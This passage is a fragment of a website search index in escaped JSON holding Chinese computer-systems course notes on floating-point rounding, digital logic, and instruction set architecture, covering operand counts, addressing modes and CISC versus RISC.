\u5206\u6570\u90e8\u5206\u5168\u4e3a 0\uff0c\u4e14 \\(s=0\\) \uff0c\u8868\u793a \\(+\\infty\\) \u5206\u6570\u90e8\u5206\u5168\u4e3a 0\uff0c\u4e14 \\(s=1\\) \uff0c\u8868\u793a \\(-\\infty\\) \u5206\u6570\u90e8\u5206\u4e0d\u5168\u4e3a 0\uff0c\u8868\u793a NaN","title":"\u7279\u6b8a\u503c"},{"location":"cs/system/cs1/topic1/#_18","text":"\u820d\u5165\uff08rounding\uff09\u6709\u56db\u79cd\uff1a\u5411\u5076\u820d\u5165\uff08round-to-even\uff09\u3001\u5411 0 \u820d\u5165\uff08round-toward-zero\uff09\u3001\u5411\u4e0b\u820d\u5165\uff08round-down\uff09\u3001\u5411\u4e0a\u820d\u5165\uff08round-up\uff09 \u9ed8\u8ba4\u662f round-to-even \u5982\u679c\u6709\u4e00\u4e2a\u4e8c\u8fdb\u5236\u5c0f\u6570\uff1aX...XX.Y...Yabcd...\uff0c\u8981\u820d\u5165\u5230 a \u7684\u4f4d\u7f6e \u5982\u679c bcd \u5c0f\u4e8e 100 2 \uff0c\u5219\u76f4\u63a5\u820d\u53bb bcd \u5982\u679c bcd \u5927\u4e8e 100 2 \uff0c\u5219\u5411 a \u8fdb\u4e00\u4f4d \u5982\u679c bcd \u7b49\u4e8e 100 2 \u5982\u679c a \u4e3a 0\uff08\u5076\uff09\uff0c\u5219\u820d\u53bb bcd \u5982\u679c a \u4e3a 1\uff08\u5947\uff09\uff0c\u5219\u5411 a \u8fdb\u4e00\u4f4d","title":"\u820d\u5165"},{"location":"cs/system/cs1/topic1/#_19","text":"\u4f1a\u5b58\u5728\u820d\u5165\u95ee\u9898 \u662f\u963f\u8d1d\u5c14\u7fa4\uff0c\u6ee1\u8db3\u4ea4\u6362\u5f8b\uff0c\u4f46\u4e0d\u6ee1\u8db3\u7ed3\u5408\u5f8b","title":"\u6d6e\u70b9\u6570\u52a0\u6cd5"},{"location":"cs/system/cs1/topic2/","text":"\u6570\u5b57\u903b\u8f91\u57fa\u7840 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e09\uff5e\u4e94\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a Computer Organization and Design: The Hardware/Software Interface (RISC-V edition) Appendix A: The Basics of Logic Design \u903b\u8f91\u4e0e\u8ba1\u7b97\u673a\u8bbe\u8ba1\u57fa\u7840\uff08\u7b2c\u4e94\u7248\uff09","title":"\u6570\u5b57\u903b\u8f91\u7535\u8def\u57fa\u7840"},{"location":"cs/system/cs1/topic2/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e09\uff5e\u4e94\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a Computer Organization and Design: The Hardware/Software Interface (RISC-V edition) Appendix A: The Basics of Logic Design \u903b\u8f91\u4e0e\u8ba1\u7b97\u673a\u8bbe\u8ba1\u57fa\u7840\uff08\u7b2c\u4e94\u7248\uff09","title":"\u6570\u5b57\u903b\u8f91\u57fa\u7840"},{"location":"cs/system/cs1/topic3/","text":"\u7ec4\u5408\u903b\u8f91\u7535\u8def \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e94\uff5e\u516b\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a","title":"\u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1"},{"location":"cs/system/cs1/topic3/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e94\uff5e\u516b\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a","title":"\u7ec4\u5408\u903b\u8f91\u7535\u8def"},{"location":"cs/system/cs1/topic4/","text":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u516b\uff5e\u5341\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a","title":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1"},{"location":"cs/system/cs1/topic4/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u516b\uff5e\u5341\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a","title":"\u65f6\u5e8f\u903b\u8f91\u7535\u8def"},{"location":"cs/system/cs1/topic5/","text":"\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u5341\u4e00\uff5e\u5341\u4e8c\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a \u903b\u8f91\u4e0e\u8ba1\u7b97\u673a\u8bbe\u8ba1\u57fa\u7840\uff08\u7b2c\u4e94\u7248\uff09 \u7b2c\u4e5d\u7ae0\u3001\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 ISA \u6982\u5ff5 \u00b6 \u6307\u4ee4 \u00b6 \u6307\u4ee4\uff08instruction\uff09= \u64cd\u4f5c\u7b26\uff08opcode\uff09+ \u64cd\u4f5c\u6570\uff08operand\uff09 \u6307\u4ee4\u683c\u5f0f\u5305\u542b\u957f\u5ea6\u3001\u64cd\u4f5c\u6570\u4e2a\u6570\u3001\u5bc4\u5b58\u5668\u4e2a\u6570\u3001\u5bfb\u5740\u5185\u5b58\u5927\u5c0f\u3001\u5bfb\u5740\u6a21\u5f0f\u7b49 \u6307\u4ee4\u96c6 \u00b6 CPU \u53ef\u4ee5\u201c\u7406\u89e3\u201d\u7684\u4e00\u7cfb\u5217\u6307\u4ee4\uff0c\u4ee5\u4e8c\u8fdb\u5236\u673a\u5668\u7801\uff08machine code\uff09\u7684\u5f62\u5f0f\u8868\u73b0 \u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 \u00b6 \u89c4\u5b9a\u4e86\u6240\u6709\u786c\u4ef6\u5b9e\u73b0\u7684\u6307\u4ee4\u3001\u89c4\u5b9a\u4e86\u6307\u4ee4\u7b26\u53f7\u540d\u79f0\u3001\u4e8c\u8fdb\u5236\u7f16\u7801\u683c\u5f0f\uff0c\u63d0\u4f9b\u4e86\u6bcf\u6761\u6307\u4ee4\u7cbe\u786e\u5b9a\u4e49\u7684\u201d\u624b\u518c\u201c\u5373\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\uff08ISA\uff0cInstruction Set Architecture\uff09 \u8ba1\u7b97\u673a\u6839\u636e ISA \u5b9e\u73b0\uff0cISA \u53ef\u4ee5\u6709\u591a\u79cd\u5b9e\u73b0\u3001ISA \u4f7f\u8f6f\u4ef6\u53ef\u4ee5\u64cd\u7eb5\u786c\u4ef6\u3001ISA \u5b9a\u4e49\u4e86\u673a\u5668\u8bed\u8a00\uff0cISA \u89c4\u5b9a\u4e86\u5fae\u5904\u7406\u5668\uff08microprocessor\uff09\u7684\u8bbe\u8ba1\uff08ISA \u5b9a\u4e49\u4e86 CPU \u6216\u8005\u4e00\u7c7b CPU\uff0c\u5b83\u5305\u542b CPU \u7684\u5185\u5b58\u89c6\u56fe\u3001\u5bc4\u5b58\u5668\u4e2a\u6570\u7b49\u4fe1\u606f\uff0c\u800c\u4e0d\u53ea\u662f\u4e00\u7cfb\u5217\u6307\u4ee4\u7684\u96c6\u5408\uff09 \u6ce8\uff1a\u4f53\u7cfb\u7ed3\u6784\u8986\u76d6\u6574\u4e2a\u8ba1\u7b97\u673a\uff0c\u5305\u62ec ISA\u3001\u7ec4\u6210\u548c\u786c\u4ef6\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f ISA\u3002ISA \u4e5f\u4e0d\u662f CPU \u7684\u4f53\u7cfb\u7ed3\u6784\uff08\u540c\u4e00 ISA \u6709\u4e0d\u540c\u79cd CPU\uff09 ISA \u8bbe\u8ba1 \u00b6 \u8bbe\u8ba1\u539f\u5219 \u00b6 \u6307\u4ee4\u683c\u5f0f\u8bbe\u8ba1\u539f\u5219 \u00b6 \u6307\u4ee4\u957f\u5ea6\u8981\u77ed \u4e3a\u65b0\u7684 opcode \u7559\u51fa\u8db3\u591f\u7a7a\u95f4 \u6709\u533a\u5206\u6027\u7684\u7f16\u7801 \u8bbe\u8ba1\u597d\u64cd\u4f5c\u6570\u7684\u4e2a\u6570 \u8bbe\u8ba1\u597d\u6307\u4ee4\u7684\u5bf9\u9f50\u6a21\u5f0f \u4fdd\u6301\u89c4\u8303\u5316 ISA \u8bbe\u8ba1\u539f\u5219 \u00b6 Simplicity favors regularity Make the common case fast Smaller is faster Good design demands good compromises \u64cd\u4f5c\u6570 \u00b6 \u64cd\u4f5c\u6570\u4e2a\u6570 \u00b6 \u4e00\u822c\u6ca1\u6709 4 \u4e2a\u6216\u4ee5\u4e0a\u64cd\u4f5c\u6570\u7684\u6307\u4ee4\uff0c\u8fd9\u6837\u6bcf\u4e2a\u64cd\u4f5c\u6570\u4e0d\u4e00\u5b9a\u90fd\u4f1a\u7528\u4e0a\uff0c\u800c\u4e14\u4f1a\u589e\u52a0 CPU \u7684\u590d\u6742\u5ea6\uff0c\u5e76\u4e14\u4f7f\u6307\u4ee4\u53d8\u957f \u5927\u90e8\u5206\u6307\u4ee4\u96c6\u5747\u6709 0/1/2/3 \u4e2a\u64cd\u4f5c\u6570\u3002\u4e0b\u9762\u4ee5\u8ba1\u7b97 Y = (A - B) / (C + (D * E)) \u4e3a\u4f8b\u5b50 \u4e09\u64cd\u4f5c\u6570\u6307\u4ee4 \u00b6 \u53ef\u4ee5\u6709\u4e24\u4e2a\u6e90\u64cd\u4f5c\u6570\u548c\u4e00\u4e2a\u76ee\u7684\u64cd\u4f5c\u6570 SUB R1 , A , B MUL R2 , D , E ADD R2 , R2 , C DIV R1 , R1 , R2 \u4e09\u64cd\u4f5c\u6570\u7684\u6307\u4ee4\u4f18\u70b9\u662f\u53ef\u4ee5\u5f88\u7075\u6d3b\u5730\u6307\u5b9a\u7ed3\u679c\u5b58\u653e\u5728\u54ea\u91cc\uff0c\u8ba1\u7b97\u8868\u8fbe\u5f0f\u7684\u7a0b\u5e8f\u5f88\u77ed\uff0c\u7f3a\u70b9\u662f\u4e8c\u8fdb\u5236\u7f16\u7801\u6307\u4ee4\u65f6\u9700\u8981\u7528\u8f83\u591a\u4f4d\u6570\u6765\u6307\u5b9a\u4e09\u4e2a\u5730\u5740 \u4e8c\u64cd\u4f5c\u6570\u6307\u4ee4 \u00b6 \u538b\u7f29\u76ee\u7684\u64cd\u4f5c\u6570\u5230\u6e90\u64cd\u4f5c\u6570\uff0c\u4e5f\u5c31\u662f\u7528\u4e00\u4e2a\u6e90\u64cd\u4f5c\u6570\u540c\u65f6\u4ee3\u8868\u76ee\u7684 SUB A , B ; A <- A - B MUL D , E ; D <- D * E ADD D , C ; D <- D + C DIV A , D ; A <- A / D \u4f46\u662f\u8fd9\u6837\u4f1a\u66f4\u6539 ABCDE \u539f\u6765\u7684\u503c\uff0c\u6240\u4ee5\u9700\u8981\u901a\u8fc7 MOV \u7c7b\u6307\u4ee4\u6765\u6682\u5b58\u7528\u505a\u8ba1\u7b97\uff1a MOV R1 , A MOV R2 , D SUB R1 , B MUL R2 , E ADD R2 , C DIV R1 , R2 \u6240\u4ee5\u5b83\u4f1a\u6bd4\u4e09\u64cd\u4f5c\u6570\u6307\u4ee4\u7684\u6307\u4ee4\u6761\u6570\u66f4\u591a \u4e00\u64cd\u4f5c\u6570\u6307\u4ee4 \u00b6 \u53ef\u4ee5\u901a\u8fc7\u7ee7\u7eed\u9690\u85cf\u4e00\u4e2a\u64cd\u4f5c\u6570\u7684\u65b9\u6cd5\u6765\u6784\u9020\u51fa\u4e00\u64cd\u4f5c\u6570\u7684\u6307\u4ee4\uff0c\u6bd4\u5982\u89c4\u5b9a\u8fd0\u7b97\u4e2d\u7684\u4e00\u4e2a\u64cd\u4f5c\u6570\u548c\u76ee\u7684\u90fd\u4e3a Acc\uff08\u7d2f\u52a0\u5668\uff09 LDA D ; Acc <- D MUL E ; Acc <- Acc * E ADD C ; Acc <- Acc + C STO R1 ; R1 <- Acc LDA A ; Acc <- A SUB B ; Acc <- Acc - B DIV R1 ; Acc <- Acc / R1 \u8fd9\u6837\u6307\u4ee4\u6761\u6570\u4f1a\u66f4\u591a\uff0c\u4f46\u662f CPU \u5374\u66f4\u5bb9\u6613\u8bbe\u8ba1 \u96f6\u64cd\u4f5c\u6570\u6307\u4ee4 \u00b6 \u56e0\u4e3a\u662f\u96f6\u64cd\u4f5c\u6570\uff0c\u6240\u4ee5\u6307\u4ee4\u8fd0\u7b97\u4e2d\u7684\u4e09\u4e2a\u5730\u5740\u90fd\u662f\u9690\u5f0f\u7684\uff0c\u53ef\u4ee5\u4f7f\u7528\u6808\u6765\u64cd\u4f5c\uff0c\u5373\u6bcf\u6b21\u8fd0\u7b97\u53d6\u51fa\u6808\u9876\u4e24\u4e2a\u5143\u7d20\u7136\u540e\u8fd0\u7b97\u540e\u5c06\u7ed3\u679c\u538b\u56de\u6808\u4e2d PUSH B ; B PUSH A ; B, A SUB ; A-B PUSH E ; A-B, E PUSH D ; A-B, E, D MUL ; A-B, D*E PUSH C ; A-B, D*E, C ADD ; A-B, C+D*E DIV ; (A-B)/(C+D*E) \u53ef\u89c1\u64cd\u4f5c\u6570\u8d8a\u591a\uff0c\u6307\u4ee4\u8d8a\u590d\u6742\u4f46\u7a0b\u5e8f\u5305\u542b\u7684\u6307\u4ee4\u6761\u6570\u5c11\uff1b\u64cd\u4f5c\u6570\u8d8a\u591a\uff0c\u6307\u4ee4\u8d8a\u7b80\u5355\uff0c\u6307\u4ee4\u6267\u884c\u8d8a\u5feb\uff0c\u4f46\u7a0b\u5e8f\u5305\u542b\u7684\u6307\u4ee4\u6761\u6570\u4e5f\u4f1a\u8d8a\u591a \u5bfb\u5740\u6a21\u5f0f \u00b6 \u5728\u6307\u4ee4\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u4f55\u83b7\u53d6\u64cd\u4f5c\u6570\u53d6\u51b3\u4e8e\u6307\u4ee4\u7684\u5bfb\u5740\u6a21\u5f0f\u3002\u5bfb\u5740\u6a21\u5f0f\u6307\u5b9a\u4e86\u4e00\u4e2a\u5728\u5b9e\u9645\u8bbf\u95ee\u64cd\u4f5c\u6570\u4e4b\u524d\uff0c\u89e3\u91ca\u6216\u8c03\u6574\u6307\u4ee4\u5730\u5740\u5b57\u6bb5\u7684\u89c4\u5219\uff0c\u7528\u8fd9\u4e2a\u89c4\u5219\u53ef\u4ee5\u751f\u6210\u64cd\u4f5c\u6570\u7684\u6709\u6548\u5730\u5740\uff08effective address\uff09\u3002 \u5bfb\u5740\u6a21\u5f0f\u53ef\u4ee5\u6307\u5b9a\u5230\u5e38\u6570\u3001\u5bc4\u5b58\u5668\u548c\u5185\u5b58\u5730\u5740\u3002\u9ad8\u6548\u7684\u5bfb\u5740\u6a21\u5f0f\u8bbe\u8ba1\u53ef\u4ee5\u51cf\u5c11\u6307\u4ee4\u7684\u957f\u5ea6\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u5bfb\u5740\u6a21\u5f0f \u7acb\u5373\u6570\u5bfb\u5740 \u00b6 \u7acb\u5373\u6570\u5bfb\u5740\uff08immediate addressing\uff09\u5373\u64cd\u4f5c\u6570\u5c31\u5728\u6307\u4ee4\u5f53\u4e2d\uff0c\u4e5f\u5c31\u662f\u6307\u4ee4\u4e2d\u6709\u4e00\u4e2a\u64cd\u4f5c\u6570\u5b57\u6bb5\u5c31\u4ee3\u8868\u4e86\u8fd9\u4e2a\u5e38\u6570\u672c\u8eab\u800c\u4e0d\u662f\u5730\u5740\u3002 \u76f4\u63a5\u5bfb\u5740 \u00b6 \u76f4\u63a5\u5bfb\u5740\uff08direct addressing\uff09\u5373\u64cd\u4f5c\u6570\u4f5c\u4e3a\u5185\u5b58\u5730\u5740\uff0c\u76f4\u63a5\u8bfb\u53d6\u8be5\u5730\u5740\u5904\u7684\u503c\u8fdb\u884c\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u6307\u4ee4\u4e2d\u6709 ADRS\uff0c\u4f46\u5b9e\u9645\u7528\u7684\u662f M[ADRS] \u8fd9\u5c31\u6709\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679c\u662f 32 \u4f4d\u7684\u5730\u5740\uff0c\u6307\u4ee4\u4e5f\u662f 32 \u4f4d\u7684\uff0c\u4e0d\u80fd\u653e\u4e0b\u5b8c\u6574\u7684\u5730\u5740\uff0c\u6240\u4ee5\u4e00\u822c\u4f7f\u7528\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u914d\u5408\uff0c\u9690\u542b\u4e00\u4e2a\u6bb5\u5730\u5740\uff0c\u7136\u540e ADRS \u4ec5\u4f7f\u7528\u504f\u79fb\u5730\u5740\u3002\u4f46\u662f\u76f4\u63a5\u5bfb\u5740\u9700\u8981\u5728\u6c47\u7f16\u7684\u65f6\u5019\u5c31\u77e5\u9053\u51c6\u786e\u7684\u5730\u5740\u4f4d\u7f6e \u76f4\u63a5\u5bfb\u5740\u7684\u5730\u5740\u4e5f\u53ef\u4ee5\u4ee3\u8868\u4e00\u4e2a\u5bc4\u5b58\u5668 \u95f4\u63a5\u5bfb\u5740 \u00b6 \u95f4\u63a5\u5bfb\u5740\uff08indire addressing\uff09\u5373\u64cd\u4f5c\u6570\u4e2d\u5305\u542b\u5185\u5b58\u5730\u5740\uff0c\u8fd9\u4e2a\u5185\u5b58\u5730\u5740\u5904\u7684\u503c\u8fd8\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u6240\u6307\u5411\u7684\u4f4d\u7f6e\u662f\u5b9e\u9645\u8981\u7528\u7684\u6570\u3002\u4e5f\u5c31\u662f\u6307\u4ee4\u4e2d\u6709 ADRS\uff0c\u4f46\u5b9e\u9645\u7528\u7684\u662f M[M[ADRS]] ADRS \u5fc5\u987b\u5728\u6c47\u7f16\u7684\u65f6\u5019\u56fa\u5b9a\uff0c\u4f46\u662f ADRS \u6240\u6307\u5411\u7684\u4f4d\u7f6e\u53ef\u4ee5\u662f\u53d8\u5316\u7684\uff0c\u8fd9\u6837\u53ef\u4ee5\u4f7f\u8bbf\u95ee\u6570\u7ec4\u8fd9\u6837\u7684\u64cd\u4f5c\u53d8\u5f97\u66f4\u65b9\u4fbf ADRS \u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668 \u53d8\u5740\u5bfb\u5740\u4e0e\u57fa\u5740\u5bfb\u5740 \u00b6 \u4e8c\u8005\u5f88\u76f8\u4f3c\uff0c\u90fd\u662f\u5c06\u5bc4\u5b58\u5668\u503c\u4e0e\u5730\u5740\u52a0\u8d77\u6765\u7684\u548c\u4f5c\u4e3a\u5b9e\u9645\u8981\u8bbf\u95ee\u7684\u5730\u5740 \u53d8\u5740\u5bfb\u5740\uff08indexed addressing\uff09\uff0c\u5bc4\u5b58\u5668\u4fdd\u5b58\u7684\u662f\u504f\u79fb\u5730\u5740\uff0c\u6307\u4ee4\u4e2d\u5730\u5740\u4fdd\u5b58\u7684\u662f\u57fa\u5730\u5740 \u57fa\u5740\u5bfb\u5740\uff08based addressing\uff09\uff0c\u5bc4\u5b58\u5668\u4fdd\u5b58\u7684\u662f\u57fa\u5730\u5740\uff0c\u6307\u4ee4\u4e2d\u5730\u5740\u662f\u504f\u79fb\u5730\u5740 \u603b\u7ed3\uff1a \u5bfb\u5740\u6a21\u5f0f \u8868\u793a\u6cd5 \u542b\u4e49 \u7acb\u5373\u6570\u5bfb\u5740 #K K \u76f4\u63a5\u5bfb\u5740 K M[K] \u95f4\u63a5\u5bfb\u5740 (K) M[M[K]] \u5bc4\u5b58\u5668\u5bfb\u5740 (Rn) M[Rn] \u5bc4\u5b58\u5668\u53d8\u5740\u5bfb\u5740 (Rm+Rn) M[Rm+Rn] \u5bc4\u5b58\u5668\u57fa\u5740\u5bfb\u5740 (Rm+X) M[Rm+X] \u5bc4\u5b58\u5668\u57fa\u5740\u53d8\u5740\u5bfb\u5740 (Rm+Rn+X) M[Rm+Rn+X] \u64cd\u4f5c\u7c7b\u578b\u53ca\u7f16\u7801 \u00b6 \u64cd\u4f5c\u7c7b\u578b \u00b6 \u4e00\u822c\u7684\u6307\u4ee4\u96c6\u90fd\u5305\u542b\u4e0b\u9762\u8fd9\u4e9b\u79cd\u64cd\u4f5c\u7c7b\u578b\uff1a \u7b97\u6570\u8fd0\u7b97\u3001\u903b\u8f91\u8fd0\u7b97 \u79fb\u4f4d\u8fd0\u7b97 \u6570\u636e\u4f20\u9001\uff08MOV/LOAD/STORE \u4e4b\u7c7b\uff09 \u5b57\u7b26\u4e32\u8fd0\u7b97 \u63a7\u5236\u6d41\u53d8\u5316\uff08BRANCH/JMP/CALL/RET \u7b49\uff09 \u7cfb\u7edf\u6307\u4ee4\uff08HALT/INT \u7b49\uff09 \u8f93\u5165\u8f93\u51fa ... \u6307\u4ee4\u7f16\u7801 \u00b6 \u6307\u4ee4\u7f16\u7801\u7684\u957f\u5ea6\u6709\u51e0\u79cd \u53d8\u957f\uff08Variable\uff09\uff1a\u6bcf\u6761\u6307\u4ee4\u7684\u957f\u5ea6\u90fd\u4e0d\u4e00\u5b9a \u5b9a\u957f\uff08Fixed\uff09\uff1a\u6240\u6709\u6307\u4ee4\u90fd\u662f\u540c\u4e00\u957f\u5ea6 \u6df7\u5408\uff08Hybrid\uff09\uff1a\u6709\u591a\u79cd\u6307\u4ee4\u7684\u957f\u5ea6 \u4e00\u822c\u5982\u679c\u4ee3\u7801\u7684\u5927\u5c0f\u6700\u91cd\u8981\u7684\u8bdd\u9009\u62e9\u53d8\u957f\u6307\u4ee4\uff0c\u5982\u679c\u662f\u6267\u884c\u8868\u73b0\u6700\u91cd\u8981\u7684\u8bdd\u9009\u62e9\u5b9a\u957f\u6307\u4ee4\u3002\u800c\u4e00\u4e9b\u4e3a\u4e86\u517c\u5bb9\uff0c\u53ef\u80fd\u4f1a\u9009\u62e9\u6df7\u5408\u957f\u5ea6\u6307\u4ee4 RISC \u4e0e CISC \u00b6 CISC \u00b6 CISC\uff08Complex Instruction Set Computer\uff09\u5373\u590d\u6742\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a \u7f16\u7a0b\u548c\u6267\u884c\u4e4b\u95f4\u7684\u8bed\u4e49\u95f4\u9694\uff08semantic gap\uff09\u5c0f \u7a0b\u5e8f\u673a\u5668\u7801\u4f53\u79ef\u5c0f \u7f16\u8bd1\u8fc7\u7a0b\u7b80\u5355 CISC \u7c7b\u578b\u7684\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\u6709 x86\u3001Intel 432\u3001IBM 360\u3001DEC VAX \u7b49 RISC \u00b6 RISC\uff08Reduced Instruction Set Computer\uff09\u5373\u7cbe\u7b80\u6307\u4ee4\u96c6\u8ba1\u7b97\u673a \u7531 IBM \u53d1\u660e RISC \u7684\u6307\u4ee4\u5f88\u5c11\uff0c\u800c\u4e14\u6bcf\u4e2a\u6307\u4ee4\u7b80\u5355\uff0c\u957f\u5ea6\u56fa\u5b9a CISC \u6bcf\u589e\u52a0\u4e00\u4e2a\u6307\u4ee4\u90fd\u4f1a\u4f7f\u89e3\u7801\u53d8\u6162\uff0c\u4ece\u800c\u4f7f\u6574\u4e2a ISA \u90fd\u4f1a\u53d8\u6162\uff0c\u4f46 RISC \u4e0d\u4f1a \u8fd0\u7b97\u7684\u64cd\u4f5c\u6570\u90fd\u662f\u5bc4\u5b58\u5668\uff08reg-reg\uff09 \u7f16\u8bd1\u4f1a\u66f4\u590d\u6742 RISC \u7c7b\u578b\u7684\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\u6709 RISC I\u3001RISC II\u3001MIPS\u3001ARM\u3001RISC V \u7b49 CISC \u4e0e RISC \u533a\u522b\uff1a CISC RISC \u53d8\u957f\u6307\u4ee4 \u5b9a\u957f\u6307\u4ee4 \u5927\u91cf\u6307\u4ee4\u548c\u5bfb\u5740\u6a21\u5f0f \u6307\u4ee4\u548c\u5bfb\u5740\u6a21\u5f0f\u90fd\u5f88\u5c11 \u7f16\u7801\u957f\u3001\u590d\u6742 \u7f16\u7801\u7b80\u5355 \u5305\u542b\u4ece\u5185\u5b58\u5230\u5185\u5b58\u7684\u64cd\u4f5c \u53ea\u80fd\u5b58/\u53d6 \u4f7f\u7528\u5fae\u6307\u4ee4 \u6ca1\u6709\u5fae\u6307\u4ee4\uff0c\u4e00\u5207\u90fd\u76f4\u63a5\u4ece\u6307\u4ee4\u4e2d\u89e3\u7801\u51fa\u6765 \u8bed\u4e49\u95f4\u9694\u5c0f \u9700\u8981\u66f4\u667a\u80fd\u7684\u7f16\u8bd1\u5668 CISC \u548c RISC \u5728\u53d1\u5c55\u4e2d\u4e5f\u4e0d\u5e94\u5b8c\u5168\u5272\u88c2 \u5bfb\u5740\u7ed3\u6784 \u00b6 \u5bfb\u5740\u7ed3\u6784\u6709\u51e0\u79cd\uff1a \u7d2f\u52a0\u5668\u7ed3\u6784\uff0cAccumulator\uff081960 \u524d\uff0c\u5982 68HC11\uff09 \u6808\u7ed3\u6784\uff0cStack\uff081960s ~ 1970s\uff09 \u5b58\u50a8\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784\uff0cMemory-Memory\uff081970s ~ 1980s\uff09 \u5bc4\u5b58\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784\uff0cRegister-Memory\uff081970s \u81f3\u4eca\uff0c\u5982 x86\uff09 \u5bc4\u5b58\u5668\u5230\u5bc4\u5b58\u5668\u7ed3\u6784\uff0cRegister-Register\uff081960s \u81f3\u4eca\uff0c\u5982 MIPS\uff09\uff0c\u53c8\u79f0\u88c5\u8f7d/\u5b58\u50a8\u7ed3\u6784\uff08Load/Store\uff09 \u6808\u7ed3\u6784 \u00b6 ALU \u8fd0\u7b97\u6ca1\u6709\u64cd\u4f5c\u6570\uff0cpush/pop \u6709\u4e00\u4e2a\u64cd\u4f5c\u6570 \u4f18\u70b9 \u6307\u4ee4\u77ed \u786c\u4ef6\u8981\u6c42\u4f4e \u7f16\u8bd1\u5668\u597d\u5199 \u7f3a\u70b9 \u6548\u7387\u4f4e \u6808\u7a7a\u95f4\u6709\u9650 \u5e76\u884c\u6216\u6d41\u6c34\u7ebf\u80fd\u529b\u5f31 \u7f16\u8bd1\u5668\u96be\u4f18\u5316 \u4f8b\u5b50\uff1a60 \u5e74\u4ee3\u7684 B5500/6500 HP3000/70\uff0c\u73b0\u5728\u7684 Java \u865a\u62df\u673a \u7d2f\u52a0\u5668\u7ed3\u6784 \u00b6 \u4f7f\u7528\u5355\u4e2a\u64cd\u4f5c\u6570\uff08\u4e00\u4e2a\u663e\u5f0f\u4e00\u4e2a\u9690\u542b\uff09 \u6307\u4ee4\u6709 ALU \u8fd0\u7b97\u3001\u52a0\u8f7d\u5230\u7d2f\u52a0\u5668\u3001\u4ece\u7d2f\u52a0\u5668\u8f93\u51fa\u5230\u5b58\u50a8\u5668 \u4f18\u70b9 \u786c\u4ef6\u8981\u6c42\u6781\u4f4e \u6613\u4e8e\u8bbe\u8ba1\u3001\u7406\u89e3 \u7f3a\u70b9 \u7d2f\u52a0\u5668\u6210\u4e3a\u74f6\u9888 \u5e76\u884c/\u6d41\u6c34\u7ebf\u80fd\u529b\u5f31 \u9700\u8981\u7684 load store \u5f88\u591a\uff0c\u5185\u5b58\u8bfb\u5199\u9891\u7e41 \u4f8b\u5b50\uff1a\u65e9\u671f IBM 7090 \u7b49\uff0c\u73b0\u5728\u7684 DSP \u7ed3\u6784 \u5b58\u50a8\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784 \u00b6 \u6240\u6709\u7684 ALU \u8fd0\u7b97\u90fd\u4ece\u5b58\u50a8\u5668\u8bfb\u5199 \u4f18\u70b9 \u65e0\u9700\u4f7f\u7528\u5bc4\u5b58\u5668 \u9700\u8981\u7684\u6307\u4ee4\u6570\u91cf\u5c11 \u5bb9\u6613\u5199\u7f16\u8bd1\u5668 \u7f3a\u70b9 \u6307\u4ee4\u957f\u5ea6\u53d8\u5316\u5927 \u6bcf\u6761\u6307\u4ee4\u6267\u884c\u7684\u65f6\u95f4\u6d6e\u52a8\u4e5f\u5927 \u5de8\u5927\u7684\u5b58\u50a8\u5668\u8bfb\u5199\u5bfc\u81f4\u6548\u7387\u4f4e \u4f8b\u5b50\uff1aVAX \u5bc4\u5b58\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784 \u00b6 ALU \u64cd\u4f5c\u4e2d\u6709\u4e00\u4e2a\u5b58\u50a8\u5668 \u4e00\u822c\u6307\u4ee4\u6709\u4e24\u4e2a\u64cd\u4f5c\u6570 \u4f18\u70b9 \u6307\u4ee4\u6570\u91cf\u5c11 \u6307\u4ee4\u6613\u4e8e\u7f16\u89e3\u7801 \u7f3a\u70b9 \u8fd0\u7b97\u7ed3\u679c\u4f1a\u8986\u76d6\u539f\u503c \u6307\u4ee4\u957f\u5ea6\u53d8\u5316\u5927 \u6307\u4ee4\u8fd0\u884c\u65f6\u95f4\u53d8\u5316\u5927 \u53ef\u80fd\u4f1a\u9650\u5236\u5bc4\u5b58\u5668\u4e2a\u6570 \u4f8b\u5b50\uff1aIBM 360/370\u3001VAX \u88c5\u8f7d/\u5b58\u50a8\u7ed3\u6784 \u00b6 ALU 